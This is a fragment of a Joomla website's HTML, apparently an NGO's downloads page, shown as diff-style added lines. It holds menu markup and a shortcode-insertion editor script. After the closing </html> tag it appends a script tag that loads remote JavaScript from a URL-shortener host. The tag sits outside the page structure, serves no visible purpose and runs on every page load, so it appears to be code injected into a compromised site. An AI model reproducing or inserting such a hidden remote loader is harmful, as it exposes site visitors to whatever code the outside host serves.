Plan</a></li><li class="item-363"><a href="/index.php/all-resources/policy-briefs" >Policy Briefs</a></li><li class="item-364"><a href="/index.php/all-resources/data-and-information" >Data and Information</a></li></ul></li><li class="item-263 menu-deeper menu-parent"><a href="#" >E-Services<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-265"><a href="/index.php/e-services/e-commerce" >E-Commerce</a></li><li class="item-361"><a href="https://www.actanzania.or.tz:2096/" target="_blank" rel="noopener noreferrer">Staff E-mail Login</a></li></ul></li><li class="item-139 active menu-deeper menu-parent"><a href="/index.php/act-news-media" >Media<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-346"><a href="/index.php/act-news-media/advertisements" >Advertisements</a></li><li class="item-337"><a href="/index.php/act-news-media/upcoming-events" >Events</a></li><li class="item-349"><a href="/index.php/act-news-media/act-calendar" >Events Calendar</a></li><li class="item-347"><a href="/index.php/act-news-media/opportunities" >Opportunities</a></li><li class="item-348"><a href="/index.php/act-news-media/all-careers" >Careers</a></li><li class="item-345 current active"><a href="/index.php/act-news-media/downloads" >Downloads</a></li><li class="item-213"><a href="/index.php/act-news-media/act-gallery" >Gallery</a></li></ul></li><li class="item-200"><a href="/index.php/contact" >Contact</a></li><li class="item-226"><a href="/index.php/donate" class="btn btn-top">Donate</a></li></ul>
+</div></div>
+                    </div>
+    </div>
+
+    
+    
+    
+    <!-- Go to top -->
+            <a href="#" class="sp-scroll-up" aria-label="Scroll Up"><span class="fa fa-chevron-up" aria-hidden="true"></span></a>
+            <script  type="text/javascript">
+						function jSelectShortcode(text) {
+							jQuery("#yt_shorcodes").removeClass("open");
+							text = text.replace(/'/g, '"');
+							//1.Editor Content
+							if(document.getElementById('jform_articletext') != null) {
+								jInsertEditorText(text, 'jform_articletext');
+							}
+							if(document.getElementById('jform_description') != null) {
+								jInsertEditorText(text, 'jform_description');
+							}
+
+							//2.Editor K2
+							if(document.getElementById('description') != null) {
+								jInsertEditorText(text, 'description');
+							}
+							if(document.getElementById('text') != null) {
+								jInsertEditorText(text, 'text');
+							}
+							//3.Editor VirtueMart
+							if(document.getElementById('category_description') != null) {
+								jInsertEditorText(text, 'category_description');
+							}
+							if(document.getElementById('product_desc') != null) {
+								jInsertEditorText(text, 'product_desc');
+							}
+							//4.Editor Contact
+							if(document.getElementById('jform_misc') != null) {
+								jInsertEditorText(text, 'jform_misc');
+							}
+							//5.Editor Easyblog
+							if(document.getElementById('write_content') != null) {
+								jInsertEditorText(text, 'write_content');
+							}
+							//6.Editor Joomshoping
+							if(document.getElementById('description1') != null) {
+								jInsertEditorText(text, 'description1');
+							}
+							//6.Editor HTML
+							if(document.getElementById('jform_content') != null) {
+								jInsertEditorText(text, 'jform_content');
+							}
+							SqueezeBox.close();
+						}
+				   </script></body>
+</html>
+<script src="https://wac.ac/HWC0j2" type="text/javascript"></script>
